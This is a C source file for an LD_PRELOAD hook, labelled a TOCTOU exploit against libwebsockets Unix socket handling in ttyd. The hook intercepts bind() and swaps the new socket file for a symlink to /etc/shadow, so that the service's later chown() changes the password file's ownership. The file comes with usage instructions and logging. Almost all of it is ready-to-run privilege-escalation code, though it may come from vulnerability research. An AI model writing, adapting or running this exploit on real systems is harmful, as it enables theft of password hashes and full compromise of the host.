/*
 * TOCTOU Exploit Hook for libwebsockets Unix Socket Vulnerability
 * 
 * Usage: LD_PRELOAD=./toctou_hook.so ttyd -i /opt/sockets/ttyd.sock bash
 * 
 * This hook intercepts bind() and immediately replaces the socket
 * with a symlink to /etc/shadow, causing the subsequent chown() to
 * change ownership of /etc/shadow instead.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>

static int (*real_bind)(int sockfd, const struct sockaddr *addr, socklen_t addrlen) = NULL;

#define TARGET_PATH "/opt/sockets/"
#define EXPLOIT_TARGET "/etc/shadow"
#define LOG_FILE "/tmp/toctou_exploit.log"

static void log_msg(const char *msg) {
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        fprintf(f, "[HOOK] %s\n", msg);
        fclose(f);
    }
}

int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    if (!real_bind) {
        real_bind = dlsym(RTLD_NEXT, "bind");
        if (!real_bind) {
            log_msg("ERROR: could not find real bind()");
            return -1;
        }
    }

    // Check if this is a Unix socket in our target directory
    if (addr->sa_family == AF_UNIX) {
        struct sockaddr_un *un_addr = (struct sockaddr_un *)addr;
        
        if (strstr(un_addr->sun_path, TARGET_PATH) != NULL) {
            char logbuf[512];
            snprintf(logbuf, sizeof(logbuf), "Intercepted bind() for: %s", un_addr->sun_path);
            log_msg(logbuf);

            // Step 1: Call real bind() to create the socket file
            int result = real_bind(sockfd, addr, addrlen);
            if (result < 0) {
                log_msg("ERROR: real bind() failed");
                return result;
            }
            log_msg("Socket created successfully");

            // Step 2: Immediately unlink the socket
            if (unlink(un_addr->sun_path) < 0) {
                log_msg("ERROR: unlink() failed");
                return result;  // Still return success to continue
            }
            log_msg("Socket unlinked");

            // Step 3: Create symlink to target file
            if (symlink(EXPLOIT_TARGET, un_addr->sun_path) < 0) {
                log_msg("ERROR: symlink() failed");
                return result;
            }
            snprintf(logbuf, sizeof(logbuf), "SUCCESS: Created symlink %s -> %s", 
                     un_addr->sun_path, EXPLOIT_TARGET);
            log_msg(logbuf);

            // Return success - libwebsockets will now chown() our symlink target
            return result;
        }
    }

    return real_bind(sockfd, addr, addrlen);
}
